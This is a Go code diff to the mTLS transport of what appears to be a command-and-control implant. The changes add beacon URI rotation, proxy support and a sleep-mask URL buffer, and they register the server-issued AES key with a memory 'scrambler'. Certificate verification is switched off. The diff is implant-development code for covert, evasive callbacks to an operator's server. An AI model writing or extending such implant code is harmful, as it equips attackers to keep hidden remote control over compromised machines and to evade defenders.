@@ -8,6 +8,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"net/url"
 	"time"
 )
 
@@ -45,18 +46,31 @@ func newMTLSTransport(serverURL, certPEMb64, keyPEMb64, caPEMb64 string) (*mtlsT
 		InsecureSkipVerify: true,
 		MinVersion:         tls.VersionTLS13,
 		CurvePreferences: []tls.CurveID{
-			tls.X25519MLKEM768,    // hybrid PQ: X25519 + ML-KEM-768 (NIST FIPS 203)
-			tls.X25519,            // classical fallback
+			tls.X25519MLKEM768, // hybrid PQ: X25519 + ML-KEM-768 (NIST FIPS 203)
+			tls.X25519,         // classical fallback
 			tls.CurveP256,
 		},
 	}
 
-	t := &mtlsTransport{}
+	// Reuse the regular HTTP profile setup so mTLS honors URI rotation,
+	// custom headers, proxy configuration and the sleep-mask URL buffer.
+	base := newHTTPTransportOpts(serverURL, true)
+	t := &mtlsTransport{httpTransport: httpTransport{
+		serverURL:  base.serverURL,
+		urlBuf:     base.urlBuf,
+		beaconURIs: base.beaconURIs,
+		extraHdrs:  base.extraHdrs,
+	}}
+	tr := &http.Transport{TLSClientConfig: tlsCfg}
+	if ProxyURL != "" {
+		if proxy, parseErr := url.Parse(ProxyURL); parseErr == nil {
+			tr.Proxy = http.ProxyURL(proxy)
+		}
+	}
 	t.client = &http.Client{
-		Transport: &http.Transport{TLSClientConfig: tlsCfg},
+		Transport: tr,
 		Timeout:   30 * time.Second,
 	}
-	t.serverURL = serverURL
 	return t, nil
 }
 
@@ -109,6 +123,9 @@ func (t *mtlsTransport) register(info sysInfo) error {
 	}
 	t.agentID = reg.AgentID
 	t.aesKey, err = base64.StdEncoding.DecodeString(reg.AESKey)
+	if err == nil && len(t.aesKey) > 0 {
+		RegisterScramblerTarget(t.aesKey)
+	}
 	return err
 }
 
